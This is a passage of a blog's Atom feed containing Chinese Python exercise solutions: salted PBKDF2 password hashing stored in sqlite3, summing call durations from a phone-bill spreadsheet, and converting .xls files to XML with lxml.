os.path.exists(out_dir):</span><br><span class="line">                os.mkdir(out_dir)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#保存结果</span></span><br><span class="line">            out_img = os.path.join(out_dir, file)</span><br><span class="line">            out.save(out_img)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"操作失败！"</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img_dir = <span class="string">'img'</span></span><br><span class="line">    out_dir = <span class="string">'out'</span></span><br><span class="line">    MAX_RESIZE = (<span class="number">750</span>, <span class="number">1334</span>)</span><br><span class="line">    resize(img_dir, MAX_RESIZE, out_dir)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/">https://xiaotaoist.github.io/2018/05/29/python-exercise-0005/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;iPhone 6、iPhone 6 Plus 早已上市开卖。请查看你写得 第 0005 题的代码是否可以复用。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0021</title>
    <link href="https://xiaotaoist.github.io/2018/06/13/python-exercise-0021/"/>
    <id>https://xiaotaoist.github.io/2018/06/13/python-exercise-0021/</id>
    <published>2018-06-12T23:28:21.000Z</published>
    <updated>2018-06-12T13:53:34.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>通常，登陆某个网站或者 APP，需要使用用户名和密码。密码是如何加密后存储起来的呢？请使用 Python 对密码加密。</code></pre><a id="more"></a><ul><li>阅读资料 <a href="http://zhuoqiang.me/password-storage-and-python-example.html" target="_blank" rel="noopener">用户密码的存储与 Python 示例</a></li><li>阅读资料 <a href="https://www.pythoncentral.io/hashing-strings-with-python/" target="_blank" rel="noopener">Hashing Strings with Python</a></li><li>阅读资料 <a href="https://stackoverflow.com/questions/2572099/pythons-safest-method-to-store-and-retrieve-passwords-from-a-database" target="_blank" rel="noopener">Python’s safest method to store and retrieve passwords from a database</a></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>用户密码的存储与Python示例中，已经给出了解答，想要安全的存储密码至少需要把密码拼接随机salt后，存储<a href="https://zh.wikipedia.org/zh/SHA-2" target="_blank" rel="noopener">sha256</a>计算后的密文到数据库，这里我们存到<a href="https://docs.python.org/3/library/sqlite3.html" target="_blank" rel="noopener">sqlite3</a>数据库中，做个示例。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_passwd</span><span class="params">(passwd, salt=None)</span>:</span></span><br><span class="line">    <span class="comment">#把8位随机内容，转成16进制输出作为salt</span></span><br><span class="line">    <span class="keyword">if</span> salt <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        salt = binascii.b2a_hex(os.urandom(<span class="number">8</span>))</span><br><span class="line">    passwd = passwd.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment">#用hashlib自带函数，sha256，迭代10000次，生成哈希值</span></span><br><span class="line">    result = hashlib.pbkdf2_hmac(<span class="string">'sha256'</span>, passwd, salt, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#返回salt和密文</span></span><br><span class="line">    <span class="keyword">return</span> salt + binascii.b2a_hex(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_passwd</span><span class="params">(salthash, passwd)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(salthash, str):</span><br><span class="line">        salthash = salthash.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#验证是否一致</span></span><br><span class="line">    <span class="keyword">return</span> encrypt_passwd(passwd, salt=salthash[:<span class="number">16</span>]) == salthash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化sqllite3数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">"user.db"</span>)</span><br><span class="line">    c = conn.cursor()</span><br><span class="line">    c.execute(<span class="string">"DROP TABLE IF EXISTS USER;"</span>)</span><br><span class="line">    sql = <span class="string">"""CREATE TABLE USER(</span></span><br><span class="line"><span class="string">    ID INTEGER PRIMARY KEY autoincrement,</span></span><br><span class="line"><span class="string">    USERNAME   TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    PASSWORD   TEXT NOT NULL);</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    c.execute(sql)</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#注册新用户</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(conn, username, passwd)</span>:</span></span><br><span class="line">    c = conn.cursor()</span><br><span class="line">    <span class="comment">#加密</span></span><br><span class="line">    passwd = encrypt_passwd(passwd).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入到数据库</span></span><br><span class="line">    c.execute(<span class="string">"INSERT INTO USER (ID,USERNAME,PASSWORD) VALUES (NULL,?,?)"</span>,</span><br><span class="line">              (username, passwd))</span><br><span class="line">    conn.commit()</span><br><span class="line">    print(<span class="string">"注册%s成功！"</span> % (username))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sgin</span><span class="params">(conn, username, passwd)</span>:</span></span><br><span class="line">    c = conn.cursor()</span><br><span class="line">    cur = c.execute(<span class="string">"SELECT PASSWORD from USER where USERNAME=:name"</span>,</span><br><span class="line">                    &#123;<span class="string">"name"</span>: username&#125;)</span><br><span class="line">    <span class="comment">#获取密码</span></span><br><span class="line">    pwd = cur.fetchone()</span><br><span class="line">    <span class="comment">#验证用户是否存在，并验证密码</span></span><br><span class="line">    <span class="keyword">if</span> pwd <span class="keyword">and</span> verify_passwd(pwd[<span class="number">0</span>], passwd):</span><br><span class="line">        print(<span class="string">'登录%s成功！'</span> % (username))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"登录%s失败"</span> % (username))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    c = init_db()</span><br><span class="line">    register(c, <span class="string">"zhang3"</span>, <span class="string">"123456"</span>)</span><br><span class="line">    register(c, <span class="string">"li4"</span>, <span class="string">"212"</span>)</span><br><span class="line">    sgin(c, <span class="string">"zhang3"</span>, <span class="string">"1234"</span>)</span><br><span class="line">    sgin(c, <span class="string">"li"</span>, <span class="string">"12"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        user = input(<span class="string">"user:"</span>)</span><br><span class="line">        passwd = input(<span class="string">"passwd:"</span>)</span><br><span class="line">        <span class="keyword">if</span> sgin(c, user, passwd):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br></pre></td></tr></table></figure><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>还有一个极端的选择是系统完全不接触密码，用户的身份认证转交受信任的第三方来处理。例如 OpenID 这样的解决方案。系统向受信任的第三方求证用户身份的合法性，用户通过密码向第三方证明自己的身份。比如<a href="http://wiki.open.qq.com/wiki/mobile/%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7OpenID" target="_blank" rel="noopener">腾讯开放平台</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="http://zhuoqiang.me/password-storage-and-python-example.html" target="_blank" rel="noopener">http://zhuoqiang.me/password-storage-and-python-example.html</a></li><li><a href="http://www.runoob.com/sqlite/sqlite-intro.html" target="_blank" rel="noopener">http://www.runoob.com/sqlite/sqlite-intro.html</a></li><li><a href="https://blog.csdn.net/Rozol/article/details/72566661" target="_blank" rel="noopener">https://blog.csdn.net/Rozol/article/details/72566661</a></li><li><a href="https://paragonie.com/blog/2016/02/how-safely-store-password-in-2016#python" target="_blank" rel="noopener">https://paragonie.com/blog/2016/02/how-safely-store-password-in-2016#python</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;通常，登陆某个网站或者 APP，需要使用用户名和密码。密码是如何加密后存储起来的呢？请使用 Python 对密码加密。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0020</title>
    <link href="https://xiaotaoist.github.io/2018/06/12/python-exercise-0020/"/>
    <id>https://xiaotaoist.github.io/2018/06/12/python-exercise-0020/</id>
    <published>2018-06-12T02:28:21.000Z</published>
    <updated>2018-06-12T03:13:45.538Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>第 0020 题： 登陆中国联通网上营业厅 后选择「自助服务」 --&gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。</code></pre><a id="more"></a><p>我们可以看到表格内容类似如下：<br><img src="/img/0020.png" alt="0020"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们先用<a href="https://github.com/python-excel/xlrd" target="_blank" rel="noopener">xlrd</a>读取表格中通话时长，呼叫类型两列数据,再用<a href="https://docs.python.org/3/library/re.html" target="_blank" rel="noopener">re</a>去提取通话时长的数据，最后进行累加统计即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#统计时长</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collect_times</span><span class="params">(xlsname)</span>:</span></span><br><span class="line">    <span class="comment">#读取第一个表格数据</span></span><br><span class="line">    xls = xlrd.open_workbook(xlsname)</span><br><span class="line">    sheet = xls.sheet_by_index(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    sum_time = <span class="number">0</span></span><br><span class="line">    caller_sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#去掉表头</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>, sheet.nrows):</span><br><span class="line">        <span class="comment">#读取通话时长与呼叫类型两列数据</span></span><br><span class="line">        call_time, call_type = sheet.row_values(n)[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">        <span class="comment">#通过正则，得到时间，如9分23秒返回(9,23)</span></span><br><span class="line">        Min, Sec = re.match(<span class="string">r'(\d*?)[分]?(\d+)秒'</span>, call_time).groups()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#转化成秒</span></span><br><span class="line">        <span class="keyword">if</span> Min == <span class="string">''</span>: Min = <span class="string">'0'</span></span><br><span class="line">        times = int(Min) * <span class="number">60</span> + int(Sec)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#统计主叫时间</span></span><br><span class="line">        <span class="keyword">if</span> call_type == <span class="string">"主叫"</span>:</span><br><span class="line">            caller_sum += times</span><br><span class="line">        sum_time += times</span><br><span class="line"></span><br><span class="line">    <span class="comment">#打印统计结果</span></span><br><span class="line">    print(<span class="string">"本月主叫通话时间：%s分%s秒"</span> % (divmod(caller_sum, <span class="number">60</span>)))</span><br><span class="line">    print(<span class="string">"本月被叫通话时间：%s分%s秒"</span> % (divmod(sum_time - caller_sum, <span class="number">60</span>)))</span><br><span class="line">    print(<span class="string">"本月通话时间总计：%s分%s秒"</span> % (divmod(sum_time, <span class="number">60</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    data = collect_times(<span class="string">'2018年06月语音通信.xls'</span>)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-reg-expressions.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;第 0020 题： 登陆中国联通网上营业厅 后选择「自助服务」 --&amp;gt; 「详单查询」，然后选择你要查询的时间段，点击「查询」按钮，查询结果页面的最下方，点击「导出」，就会生成类似于 2014年10月01日～2014年10月31日通话详单.xls 文件。写代码，对每月通话时间做个统计。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0019</title>
    <link href="https://xiaotaoist.github.io/2018/06/11/python-exercise-0019/"/>
    <id>https://xiaotaoist.github.io/2018/06/11/python-exercise-0019/</id>
    <published>2018-06-11T10:28:21.000Z</published>
    <updated>2018-06-11T11:09:50.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将 第 0016 题中的 numbers.xls 文件中的内容写到 numbers.xml 文件中，如下所示：</code></pre><a id="more"></a><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;&lt;numbers&gt;&lt;!--     数字信息--&gt;[    [1, 82, 65535],    [20, 90, 13],    [26, 809, 1024]]&lt;/numbers&gt;&lt;/root&gt;</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>和<a href="https://xiaotaoist.github.io/2018/06/10/python-exercise-0017/">0017题</a>,<a href="https://xiaotaoist.github.io/2018/06/11/python-exercise-0018/">0018题</a>，都是一样的，这次用<a href="https://pandas.pydata.org/pandas-docs/stable/" target="_blank" rel="noopener">pandas</a>封装好的<code>read_excel</code>去读取表格内容，建立xml依旧用<a href="http://lxml.de/tutorial.html" target="_blank" rel="noopener">lxml</a>。</p><blockquote><p>pip install pandas xlrd lxml</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取xls,返回所需要样式的字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_xls</span><span class="params">(xlsname)</span>:</span></span><br><span class="line">    df = pd.read_excel(xlsname, header=<span class="keyword">None</span>)</span><br><span class="line">    d = df.to_dict(orient=<span class="string">'split'</span>)[<span class="string">'data'</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"\n\t[\n\t\t&#123;&#125;,\n\t\t&#123;&#125;,\n\t\t&#123;&#125;\n\t]\n"</span>.format(d[<span class="number">0</span>], d[<span class="number">1</span>], d[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入到xml</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_xml</span><span class="params">(xmlname, data, comment)</span>:</span></span><br><span class="line">    <span class="comment">#建立root根节点</span></span><br><span class="line">    root = etree.Element(<span class="string">'root'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#添加注释</span></span><br><span class="line">    comm = etree.Comment(comment)</span><br><span class="line">    root.append(comm)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#添加一个子节点</span></span><br><span class="line">    child = etree.SubElement(root, xmlname)</span><br><span class="line">    <span class="comment">#添加文字</span></span><br><span class="line">    child.text = data</span><br><span class="line"></span><br><span class="line">    <span class="comment">#生成xml树对象</span></span><br><span class="line">    tree = etree.ElementTree(root)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入到表格</span></span><br><span class="line">    tree.write(</span><br><span class="line">        xmlname + <span class="string">'.xml'</span>,</span><br><span class="line">        pretty_print=<span class="keyword">True</span>,</span><br><span class="line">        xml_declaration=<span class="keyword">True</span>,</span><br><span class="line">        encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    comment = <span class="string">'数字信息'</span></span><br><span class="line">    data = read_xls(<span class="string">'numbers.xls'</span>)</span><br><span class="line">    write_xml(<span class="string">'numbers'</span>, data, comment)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="http://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">http://www.runoob.com/python/att-string-format.html</a></li><li><a href="https://blog.csdn.net/m0_37804518/article/details/78444110" target="_blank" rel="noopener">https://blog.csdn.net/m0_37804518/article/details/78444110</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将 第 0016 题中的 numbers.xls 文件中的内容写到 numbers.xml 文件中，如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0018</title>
    <link href="https://xiaotaoist.github.io/2018/06/11/python-exercise-0018/"/>
    <id>https://xiaotaoist.github.io/2018/06/11/python-exercise-0018/</id>
    <published>2018-06-11T00:47:13.000Z</published>
    <updated>2018-06-10T14:12:36.816Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：</code></pre><a id="more"></a><pre><code>&lt;?xmlversion=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;&lt;cities&gt;&lt;!--     城市信息--&gt;{    &quot;1&quot; : &quot;上海&quot;,    &quot;2&quot; : &quot;北京&quot;,    &quot;3&quot; : &quot;成都&quot;}&lt;/cities&gt;&lt;/root&gt;</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>和<a href="https://xiaotaoist.github.io/2018/06/10/python-exercise-0017/">0017题</a>一样，这次我们用<a href="http://lxml.de/tutorial.html" target="_blank" rel="noopener">lxml</a>去操作xml对象,它比自带的<a href="https://docs.python.org/3/library/xml.etree.elementtree.html" target="_blank" rel="noopener">xml</a>具有更好的扩展性，还支持美化输出。</p><blockquote><p>pip install lxml xlrd</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取xls</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_xls</span><span class="params">(xlsname, sheetname)</span>:</span></span><br><span class="line">    xls = xlrd.open_workbook(xlsname)</span><br><span class="line">    sheet = xls.sheet_by_name(sheetname)</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(sheet.nrows):</span><br><span class="line">        row_d = sheet.row_values(n)</span><br><span class="line">        data[row_d[<span class="number">0</span>]] = row_d[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入到xml</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_xml</span><span class="params">(xmlname, data, comment)</span>:</span></span><br><span class="line">    <span class="comment">#建立root根节点</span></span><br><span class="line">    root = etree.Element(<span class="string">'root'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加注释</span></span><br><span class="line">    comm = etree.Comment(comment)</span><br><span class="line">    root.append(comm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加一个子节点city</span></span><br><span class="line">    child = etree.SubElement(root, xmlname)</span><br><span class="line">    <span class="comment">#添加文字</span></span><br><span class="line">    child.text = str(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#生成xml树对象</span></span><br><span class="line">    tree = etree.ElementTree(root)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入到表格</span></span><br><span class="line">    tree.write(</span><br><span class="line">        xmlname + <span class="string">'.xml'</span>,</span><br><span class="line">        pretty_print=<span class="keyword">True</span>,</span><br><span class="line">        xml_declaration=<span class="keyword">True</span>,</span><br><span class="line">        encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    comment = <span class="string">'城市信息'</span></span><br><span class="line">    data = read_xls(<span class="string">'city.xls'</span>, <span class="string">'city'</span>)</span><br><span class="line">    write_xml(<span class="string">'city'</span>, data, comment)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/processing-xml-in-python-with-element-tree.html" target="_blank" rel="noopener">https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/processing-xml-in-python-with-element-tree.html</a></li><li><a href="https://stackoverflow.com/questions/47229309/what-are-the-differences-between-lxml-and-elementtree" target="_blank" rel="noopener">https://stackoverflow.com/questions/47229309/what-are-the-differences-between-lxml-and-elementtree</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0017</title>
    <link href="https://xiaotaoist.github.io/2018/06/10/python-exercise-0017/"/>
    <id>https://xiaotaoist.github.io/2018/06/10/python-exercise-0017/</id>
    <published>2018-06-10T02:47:13.000Z</published>
    <updated>2018-06-10T07:59:03.502Z</updated>
    
